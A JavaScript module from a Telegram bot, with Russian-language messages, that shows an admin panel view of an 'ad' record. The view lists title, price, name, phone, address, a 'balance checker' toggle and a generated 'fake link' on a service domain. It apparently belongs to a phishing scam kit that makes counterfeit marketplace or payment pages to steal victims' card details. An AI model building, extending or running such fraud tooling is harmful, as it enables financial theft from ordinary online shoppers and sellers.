const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const { Ad } = require("../../database");
const locale = require("../../locale");

module.exports = async (ctx, id, userId = null) => {
  try {
    const ad = await Ad.findOne({
      where: {
        id,
      },
      include: [
        {
          association: "service",
          required: true,
          include: [
            {
              association: "country",
              required: true,
            },
          ],
        },
      ],
    });
    if (!ad)
      return ctx
        .replyOrEdit("❌ Объявление не найдено", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton(
                "◀️ Назад",
                userId ? `admin_user_${userId}_ads_1` : `admin_ads_1`
              ),
            ],
          ]),
        })
        .catch((err) => err);

    var text = `<b>📦 Объявление ${ad.service.title} ${ad.version}.0</b>

🆔 ID: <code>${ad.id}</code>

💬 Название: <b>${escapeHTML(ad.title || "отсутствует")}</b>
💰 Цена: <b>${escapeHTML(ad.price || "отсутствует")}</b>
📰 Имя: <b>${escapeHTML(ad.name || "отсутствует")}</b>
📱 Телефон: <b>${escapeHTML(ad.phone || "отсутствует")}</b>
🏡 Адрес: <b>${escapeHTML(ad.address || "отсутствует")}</b>
💸 Чекер баланса: <b>${ad.balanceChecker ? "включен" : "выключен"}</b>

🔗 Фейк-ссылка: <b>https://${ad.service.domain}/${ad.id}</b>`;

    return ctx
      .replyOrEdit(text, {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("👤 Перейти к пользователю", `admin_user_${ad.userId}`)],
          [
            Markup.callbackButton(
              `❌ Удалить объявление`,
              `admin_${userId ? `user_${userId}_` : ""}ad_${ad.id}_delete`
            ),
          ],
          [Markup.callbackButton("◀️ Назад", userId ? `admin_user_${ad.userId}_ads_1` : `admin_ads_1`)],
        ]),
      })
      .catch((err) => err);
  } catch (err) {
    return ctx.reply("❌ Ошибка").catch((err) => err);
  }
};
